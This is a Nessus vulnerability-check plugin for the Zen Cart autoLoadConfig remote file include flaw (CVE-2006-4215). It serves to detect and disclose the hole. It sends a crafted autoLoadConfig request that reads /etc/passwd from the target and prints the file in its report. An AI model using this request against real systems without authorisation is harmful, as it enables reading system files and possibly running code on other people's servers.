#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file include issue. 

Description :

The remote host is running Zen Cart, an open-source web-based shopping
cart written in PHP. 

The version of Zen Cart installed on the remote host fails to sanitize
input to the 'autoLoadConfig' array parameter before using it in
'includes/autoload_func.php' to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these flaws to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://www.gulftech.org/?node=research&article_id=00109-08152006
http://www.zen-cart.com/forum/showthread.php?t=43579

Solution :

Apply the security patches listed in the vendor advisory above. 

Risk factor :

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22234);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-4215");
  script_bugtraq_id(19543);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"28149");

  script_name(english:"Zen Cart autoLoadConfig Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file with Zen Cart");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/cart", "/catalog", "/store", "/shop", "/zencart", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "autoLoadConfig[999][0][autoType]=include&",
      "autoLoadConfig[999][0][loadFile]=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);
  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<!DOCTYPE");

    if (contents && report_verbosity)
      report = string(
        desc,
        "\n\n",
       "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
